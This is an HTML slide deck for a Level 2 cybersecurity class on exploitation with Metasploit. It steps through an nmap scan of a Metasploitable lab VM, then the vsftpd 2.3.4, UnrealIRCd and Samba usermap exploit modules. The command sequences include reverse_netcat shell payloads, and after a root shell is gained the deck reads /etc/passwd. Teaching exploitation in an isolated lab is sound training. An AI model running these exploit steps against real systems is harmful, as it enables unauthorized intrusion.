@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cybersecurity Level 2 – Practical Exploitation Using Metasploit | Week 6 Class 2</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&family=Source+Code+Pro:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-deep: #050a14;
+            --bg-card: #0c1122;
+            --bg-elevated: #111827;
+            --primary: #00e5ff;
+            --primary-dim: rgba(0, 229, 255, 0.2);
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+            --text-main: #edf2f8;
+            --text-muted: #94a3b8;
+            --border-subtle: #1e2a3a;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: radial-gradient(ellipse at 30% 20%, #0f172a, #020617 80%);
+            color: var(--text-main);
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .presentation-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        .slide {
+            position: absolute;
+            inset: 0;
+            padding: 4vh 6vw;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transform: translateX(40px) scale(0.98);
+            transition: opacity 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1), transform 0.4s ease;
+            pointer-events: none;
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            opacity: 1;
+            transform: translateX(0) scale(1);
+            pointer-events: auto;
+        }
+
+        .slide::-webkit-scrollbar { width: 5px; }
+        .slide::-webkit-scrollbar-track { background: var(--bg-card); }
+        .slide::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+
+        /* .slide-content {
+            max-width: 1400px;
+            width: 100%;
+            margin: 0 auto;
+            background: rgba(5, 10, 20, 0.85);
+            backdrop-filter: blur(6px);
+            border-radius: 32px;
+            padding: 2rem 2.2rem;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6);
+        } */
+
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            background: linear-gradient(120deg, #fff, var(--primary), #a0f0ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.02em;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            border-left: 5px solid var(--primary);
+            padding-left: 1rem;
+            margin: 0 0 1.2rem 0;
+            color: var(--primary);
+            display: block;
+        }
+
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 500;
+            margin: 1rem 0 0.6rem 0;
+            color: var(--success);
+        }
+
+        p {
+            line-height: 1.7;
+            color: var(--text-muted);
+            margin: 0.75rem 0;
+            font-size: 1rem;
+        }
+
+        .concept-box {
+            background: rgba(0, 229, 255, 0.08);
+            border-radius: 16px;
+            padding: 1.2rem;
+            margin: 1rem 0;
+            border-left: 4px solid var(--primary);
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .card {
+            background: linear-gradient(145deg, rgba(12, 17, 34, 0.95), rgba(8, 12, 24, 0.98));
+            border-radius: 20px;
+            padding: 1.3rem;
+            border: 1px solid rgba(0, 229, 255, 0.15);
+            transition: all 0.2s;
+        }
+        .card:hover { border-color: var(--primary); box-shadow: 0 5px 18px rgba(0, 229, 255, 0.1); }
+
+        .card-header {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--primary);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .code-block {
+            background: #0a0e1a;
+            border-radius: 18px;
+            padding: 1rem 1.2rem;
+            font-family: 'Source Code Pro', monospace;
+            font-size: 0.85rem;
+            border: 1px solid #1e2a3a;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+        .code-line { color: #cbd5e6; line-height: 1.6; }
+        .cmd { color: var(--primary); }
+        .comment { color: #6c8faa; }
+        .output { color: #a5d6ff; }
+        .prompt { color: #2ecc71; }
+
+        .step-list {
+            list-style: none;
+            padding-left: 0;
+        }
+        .step-list li {
+            margin-bottom: 10px;
+            padding-left: 24px;
+            position: relative;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+        .step-list li::before {
+            content: "▹";
+            position: absolute;
+            left: 4px;
+            color: var(--primary);
+            font-weight: bold;
+        }
+
+        .numbered-steps {
+            list-style: none;
+            padding-left: 0;
+            counter-reset: step-counter;
+        }
+        .numbered-steps li {
+            counter-increment: step-counter;
+            margin-bottom: 16px;
+            padding-left: 32px;
+            position: relative;
+            color: var(--text-muted);
+        }
+        .numbered-steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            background: var(--primary);
+            color: #020617;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        .outcome-box {
+            background: rgba(46, 204, 113, 0.08);
+            border-left: 3px solid var(--success);
+            border-radius: 18px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+        }
+
+        .warning-box {
+            background: rgba(243, 156, 18, 0.08);
+            border-left: 3px solid var(--warning);
+            border-radius: 18px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+        }
+
+        .danger-box {
+            background: rgba(231, 76, 60, 0.08);
+            border-left: 3px solid var(--danger);
+            border-radius: 18px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+        }
+
+        .inline-code {
+            font-family: 'Source Code Pro', monospace;
+            background: #0f172a;
+            padding: 2px 8px;
+            border-radius: 8px;
+            color: var(--primary);
+            font-size: 0.85rem;
+            border: 1px solid #253445;
+        }
+
+        .nav-arrow {
+            position: fixed;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 48px;
+            height: 48px;
+            background: rgba(12, 17, 34, 0.9);
+            border: 1px solid var(--primary);
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: var(--primary);
+            cursor: pointer;
+            transition: 0.2s;
+            z-index: 30;
+            backdrop-filter: blur(8px);
+        }
+        .nav-arrow:hover { background: var(--primary); color: #020617; transform: translateY(-50%) scale(1.05); }
+        #prev-slide { left: 20px; }
+        #next-slide { right: 20px; }
+
+        .slide-footer {
+            position: fixed;
+            bottom: 12px;
+            right: 24px;
+            background: rgba(5, 10, 20, 0.85);
+            padding: 4px 14px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-family: monospace;
+            border: 1px solid var(--primary-dim);
+            z-index: 30;
+        }
+        .progress-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            width: 0%;
+            transition: width 0.3s;
+            z-index: 40;
+        }
+        .title-slide .slide-content { text-align: center; }
+        @media (max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
+        @media (max-width: 800px) {
+            .slide { padding: 1.5rem; }
+            h1 { font-size: 2rem; }
+            h2 { font-size: 1.4rem; }
+            .nav-arrow { width: 38px; height: 38px; font-size: 1.3rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="presentation-container">
+
+    <!-- SLIDE 1: TITLE -->
+    <div class="slide title-slide active" id="slide-1">
+        <div class="slide-content">
+            <h1>Practical Exploitation Using Metasploit</h1>
+            <p style="font-size: 1.2rem; color: var(--success); margin-top: 0.5rem;">🧪 CYBERSECURITY LEVEL 2 – WEEK 6 | CLASS 2</p>
+            <p style="max-width: 800px; margin: 1rem auto; text-align: center;">🎯 Objective: Exploit a known vulnerability and gain shell access to a target system.</p>
+            <div class="danger-box" style="text-align: left;">
+                <strong>⚠️ CRITICAL REMINDER:</strong>
+                <ul class="step-list">
+                    <li>This lab is designed for YOUR Metasploitable VM only (192.168.56.102)</li>
+                    <li>Never run these commands against any system you don't own</li>
+                    <li>These techniques are for educational defense training</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 2: LAB 1 - SERVICE IDENTIFICATION (Detailed) -->
+    <div class="slide" id="slide-2">
+        <div class="slide-content">
+            <h2>🔧 Lab 1: Service Identification</h2>
+            
+            <div class="concept-box">
+                <strong>🤔 WHAT are we doing?</strong>
+                <p>Before we can exploit anything, we need to know what services are running on the target. Nmap will scan the target and tell us which ports are open and what software versions are running.</p>
+                <p><strong>Target:</strong> Metasploitable VM at IP address (usually 192.168.56.102)</p>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">📋 Step 1: Run Nmap Version Scan</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">nmap -sV 192.168.56.102</span></div>
+                    </div>
+                    <p><strong>What the flags mean:</strong></p>
+                    <ul class="step-list">
+                        <li><span class="inline-code">-sV</span> → Service version detection (tries to identify exact software and version)</li>
+                        <li><span class="inline-code">192.168.56.102</span> → Replace with your Metasploitable IP address</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <div class="card-header">📋 What to Look For</div>
+                    <p>In the output, identify vulnerable services like:</p>
+                    <ul class="step-list">
+                        <li><strong>vsftpd 2.3.4</strong> on port 21 — has a known backdoor!</li>
+                        <li><strong>UnrealIRCd 3.2.8.1</strong> on port 6667 — has a backdoor!</li>
+                        <li><strong>Samba 3.0.20</strong> on port 445 — vulnerable to CVE-2007-2447</li>
+                        <li><strong>Apache 2.2.8</strong> on port 80 — outdated, many vulnerabilities</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-line"><span class="comment"># Example Nmap output (what you should see):</span></div>
+                <div class="code-line"><span class="output">21/tcp   open  ftp     vsftpd 2.3.4</span></div>
+                <div class="code-line"><span class="output">22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1</span></div>
+                <div class="code-line"><span class="output">80/tcp   open  http    Apache httpd 2.2.8</span></div>
+                <div class="code-line"><span class="output">445/tcp  open  netbios-ssn Samba smbd 3.X</span></div>
+                <div class="code-line"><span class="output">6667/tcp open  irc     UnrealIRCd</span></div>
+            </div>
+
+            <div class="warning-box">
+                <strong>💡 Pro Tip:</strong> If you don't see vsftpd 2.3.4, your Metasploitable might be a different version. Look for other vulnerable services like UnrealIRCd or Samba — the process is the same!
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 3: LABS 2-4 - START METASPLOIT & SEARCH FOR EXPLOIT -->
+    <div class="slide" id="slide-3">
+        <div class="slide-content">
+            <h2  style="margin-top: 200px;">🔧 Labs 2-4: Launch Metasploit & Find Exploit</h2>
+            
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">📋 Lab 2: Launch Metasploit</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">msfconsole</span></div>
+                    </div>
+                    <p><strong>What happens:</strong> The Metasploit Framework Console starts. You'll see an ASCII art banner and the <span class="inline-code">msf6 &gt;</span> prompt. This may take 10-15 seconds to load.</p>
+                    <p><strong>Wait for:</strong> <span class="inline-code">msf6 &gt;</span> prompt before typing next commands.</p>
+                </div>
+                <div class="card">
+                    <div class="card-header">📋 Lab 3: Search for Exploit</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">search vsftpd</span></div>
+                    </div>
+                    <p><strong>What this does:</strong> Searches Metasploit's database for modules related to "vsftpd".</p>
+                    <p><strong>Expected output:</strong></p>
+                    <div class="code-block" style="margin-top: 5px;">
+                        <div class="code-line"><span class="output">exploit/unix/ftp/vsftpd_234_backdoor</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="concept-box">
+                <strong>📋 Lab 4: Select Exploit</strong>
+                <div class="code-block">
+                    <div class="code-line"><span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span></div>
+                </div>
+                <p><strong>What this does:</strong> Loads the selected exploit module. Your prompt will change to show the module is active.</p>
+                <div class="code-block">
+                    <div class="code-line"><span class="prompt">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</span></div>
+                </div>
+                <p><strong>Alternative:</strong> If vsftpd isn't found, try <span class="inline-code">search unreal</span> for the UnrealIRCd exploit.</p>
+            </div>
+
+            <div class="outcome-box">
+                <strong>✅ After these steps:</strong> You should have loaded the exploit module and be ready to configure it.
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 4: LABS 5-6 - CONFIGURE & RUN EXPLOIT -->
+    <div class="slide" id="slide-4">
+        <div class="slide-content">
+            <h2 style="margin-top: 280px;">🔧 Labs 5-6: Configure Target & Run Exploit</h2>
+            
+            <div class="concept-box">
+                <strong>🤔 WHY do we need to configure?</strong>
+                <p>Every exploit needs to know the target's IP address (RHOST). Some exploits also need your IP (LHOST) for reverse shells. The <span class="inline-code">show options</span> command shows what needs to be set.</p>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">📋 Lab 5: Configure Target</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">show options</span></div>
+                        <div class="code-line"><span class="comment"># See what needs to be configured</span></div>
+                        <div class="code-line"><span class="cmd">set RHOST 192.168.56.102</span></div>
+                        <div class="code-line"><span class="comment"># Replace with your Metasploitable IP</span></div>
+                    </div>
+                    <p><strong>What is RHOST?</strong> Remote HOST — the target machine's IP address.</p>
+                    <p><strong>What is LHOST?</strong> Local HOST — YOUR Kali machine's IP (needed for reverse shells).</p>
+                </div>
+                <div class="card">
+                    <div class="card-header">📋 Lab 6: Run Exploit</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">run</span></div>
+                        <div class="code-line"><span class="comment"># Or type 'exploit'</span></div>
+                    </div>
+                    <p><strong>What happens:</strong> Metasploit sends the exploit payload to the target. If successful, the backdoor triggers and you get a shell.</p>
+                    <p><strong>Expected output:</strong> Messages about sending exploit, then a command prompt appears.</p>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="code-line"><span class="comment"># Full example workflow:</span></div>
+                <div class="code-line"><span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span></div>
+                <div class="code-line"><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">set RHOST 192.168.56.102</span></div>
+                <div class="code-line"><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">set PAYLOAD cmd/unix/interact</span></div>
+                <div class="code-line"><span class="prompt">msf6 exploit(...) &gt;</span> <span class="cmd">run</span></div>
+                <div class="code-line"></div>
+                <div class="code-line"><span class="comment"># If successful, you'll see:</span></div>
+                <div class="code-line"><span class="output">[*] Command shell session 1 opened</span></div>
+                <div class="code-line"><span class="prompt">whoami</span></div>
+                <div class="code-line"><span class="output">root</span></div>
+            </div>
+
+            <div class="warning-box">
+                <strong>⚠️ Troubleshooting:</strong> If the exploit fails, try these alternatives:
+                <ul class="step-list">
+                    <li>Try <span class="inline-code">set PAYLOAD cmd/unix/reverse_netcat</span> instead</li>
+                    <li>Check your IP: <span class="inline-code">ifconfig</span> or <span class="inline-code">ip a</span> on Kali</li>
+                    <li>Verify Metasploitable is running and reachable: <span class="inline-code">ping 192.168.56.102</span></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 5: EXPECTED RESULT & INTERACT WITH SYSTEM -->
+    <div class="slide" id="slide-5">
+        <div class="slide-content">
+            <h2 style="margin-top: 160px;">✅ Expected Result & Lab 7: Interact with System</h2>
+            
+            <div class="concept-box">
+                <strong>🤔 WHAT happens when exploitation succeeds?</strong>
+                <p>You should see a command shell prompt. This means you have remote access to the target system. You can now run commands as if you were sitting at the target machine.</p>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">🎯 Expected Result</div>
+                    <ul class="step-list">
+                        <li>Command shell is opened — you see a prompt like <span class="inline-code">#</span> or <span class="inline-code">$</span></li>
+                        <li>Access to target system — you can run commands</li>
+                        <li>Depending on the exploit, you may have ROOT access!</li>
+                    </ul>
+                    <div class="code-block">
+                        <div class="code-line"><span class="comment"># What success looks like:</span></div>
+                        <div class="code-line"><span class="output">[*] Command shell session 1 opened</span></div>
+                        <div class="code-line"><span class="prompt">#</span></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">📋 Lab 7: Explore the Target</div>
+                    <p>Once you have a shell, try these commands:</p>
+                    <div class="code-block">
+                        <div class="code-line"><span class="cmd">whoami</span>   <span class="comment"># What user are you? (root? user?)</span></div>
+                        <div class="code-line"><span class="cmd">pwd</span>       <span class="comment"># Current directory path</span></div>
+                        <div class="code-line"><span class="cmd">ls -la</span>    <span class="comment"># List files in current directory</span></div>
+                        <div class="code-line"><span class="cmd">id</span>        <span class="comment"># User ID and group information</span></div>
+                        <div class="code-line"><span class="cmd">cat /etc/passwd</span>  <span class="comment"># View user accounts</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="outcome-box">
+                <strong>✅ You have successfully exploited a vulnerable service!</strong>
+                <p>You went from: Unknown target → Reconnaissance → Exploit selection → Configuration → Remote shell access.</p>
+                <p>This is the same workflow professional penetration testers use (with proper authorization).</p>
+            </div>
+
+            <div class="danger-box">
+                <strong>📌 To exit the shell:</strong> Type <span class="inline-code">exit</span> or <span class="inline-code">Ctrl+C</span><br>
+                <strong>To exit Metasploit:</strong> Type <span class="inline-code">exit</span> again or <span class="inline-code">quit</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 6: ALTERNATIVE EXPLOIT - UNREALIRCD -->
+    <div class="slide" id="slide-6">
+        <div class="slide-content">
+            <h2 style="margin-top: 100px;">🔄 Alternative: Exploiting UnrealIRCd (Backdoor)</h2>
+            <p>If vsftpd wasn't available or you want to practice another exploit, try the UnrealIRCd backdoor.</p>
+
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">📋 Step-by-Step (UnrealIRCd)</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="comment"># In Metasploit:</span></div>
+                        <div class="code-line"><span class="cmd">search unreal</span></div>
+                        <div class="code-line"><span class="cmd">use exploit/unix/irc/unreal_ircd_3281_backdoor</span></div>
+                        <div class="code-line"><span class="cmd">set RHOST 192.168.56.102</span></div>
+                        <div class="code-line"><span class="cmd">set PAYLOAD cmd/unix/reverse_netcat</span></div>
+                        <div class="code-line"><span class="cmd">set LHOST &lt;your-kali-ip&gt;</span></div>
+                        <div class="code-line"><span class="cmd">run</span></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">📋 Alternative: Samba Exploit</div>
+                    <div class="code-block">
+                        <div class="code-line"><span class="comment"># For Samba usermap exploit:</span></div>
+                        <div class="code-line"><span class="cmd">search samba usermap</span></div>
+                        <div class="code-line"><span class="cmd">use exploit/multi/samba/usermap_script</span></div>
+                        <div class="code-line"><span class="cmd">set RHOST 192.168.56.102</span></div>
+                        <div class="code-line"><span class="cmd">set PAYLOAD cmd/unix/reverse_netcat</span></div>
+                        <div class="code-line"><span class="cmd">set LHOST &lt;your-kali-ip&gt;</span></div>
+                        <div class="code-line"><span class="cmd">run</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="concept-box">
+                <strong>💡 Understanding Reverse Shell Payloads:</strong>
+                <p>When using <span class="inline-code">reverse_netcat</span>, the target connects BACK to your machine. You need to set <span class="inline-code">LHOST</span> to your Kali IP address. Metasploit automatically listens for the incoming connection.</p>
+                <div class="code-block">
+                    <div class="code-line"><span class="comment"># Find your Kali IP address:</span></div>
+                    <div class="code-line"><span class="cmd">ip a | grep inet</span></div>
+                    <div class="code-line"><span class="comment"># Look for 192.168.56.x (your Host-Only network IP)</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SLIDE 7: OUTCOME & SUMMARY -->
+    <div class="slide" id="slide-7">
+        <div class="slide-content">
+            <h2 style="margin-top: 190px;">🧾 Outcome & Class Summary</h2>
+            
+            <div class="outcome-box">
+                <strong>✅ By completing this class, you have demonstrated:</strong>
+                <ul class="step-list">
+                    <li>✔ Ability to identify vulnerable services using Nmap version scanning</li>
+                    <li>✔ Ability to navigate and use Metasploit Framework (msfconsole)</li>
+                    <li>✔ Ability to search for, select, and configure exploits</li>
+                    <li>✔ Ability to execute exploits and gain remote shell access</li>
+                    <li>✔ Understanding of the complete attack workflow from recon to access</li>
+                </ul>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">📚 Key Takeaways</div>
+                    <ul class="step-list">
+                        <li>Service version detection is critical — you can't exploit what you don't know</li>
+                        <li>Metasploit automates exploitation but understanding the steps is essential</li>
+                        <li>Always verify RHOST and LHOST before running any exploit</li>
+                        <li>Different services require different payloads (vsftpd backdoor vs reverse shell)</li>
+                        <li>Practice makes perfect — try the same exploit multiple times</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <div class="card-header">🎯 Next Class Preview</div>
+                    <ul class="step-list">
+                        <li><strong>Class 3:</strong> Privilege Escalation (from user to root)</li>
+                        <li>Manual enumeration techniques</li>
+                        <li>SUID, sudo misconfigurations, kernel exploits</li>
+                        <li><strong>Assignment:</strong> Full compromise of Metasploitable with report</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="danger-box">
+                <strong>⚠️ Final Ethical Reminder:</strong>
+                <p>You now have the skills to compromise vulnerable systems. These skills must ONLY be used:</p>
+                <ul class="step-list">
+                    <li>On systems you own (like your Metasploitable VM)</li>
+                    <li>On authorized penetration testing engagements (with written permission)</li>
+                    <li>In controlled lab environments (HTB, TryHackMe, Proving Grounds)</li>
+                </ul>
+                <p><strong>Unauthorized exploitation is a crime.</strong> Use your power for defense, not destruction.</p>
+            </div>
+
+            <p style="text-align: center; margin-top: 1.5rem; font-family: monospace; color: var(--primary);">END OF CLASS 2 – PRACTICAL EXPLOITATION USING METASPLOIT</p>
+        </div>
+    </div>
+
+    <!-- NAVIGATION -->
+    <div id="prev-slide" class="nav-arrow" onclick="changeSlide(-1)">‹</div>
+    <div id="next-slide" class="nav-arrow" onclick="changeSlide(1)">›</div>
+    <div class="slide-footer"><span id="current-slide-num">1</span> / <span id="total-slides-num">7</span></div>
+    <div class="progress-bar" id="progress-bar"></div>
+</div>
+
+<script>
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    const total = slides.length;
+    const currentSpan = document.getElementById('current-slide-num');
+    const totalSpan = document.getElementById('total-slides-num');
+    const progressFill = document.getElementById('progress-bar');
+    totalSpan.textContent = total;
+
+    function showSlide(index) {
+        if (index >= total) index = 0;
+        if (index < 0) index = total - 1;
+        slides.forEach(s => s.classList.remove('active'));
+        slides[index].classList.add('active');
+        currentSlide = index;
+        currentSpan.textContent = currentSlide + 1;
+        progressFill.style.width = ((currentSlide + 1) / total) * 100 + '%';
+    }
+
+    function changeSlide(step) { showSlide(currentSlide + step); }
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowRight' || e.key === ' ') { e.preventDefault(); changeSlide(1); }
+        else if (e.key === 'ArrowLeft') { e.preventDefault(); changeSlide(-1); }
+    });
+    showSlide(0);
+</script>
+</body>
+</html>
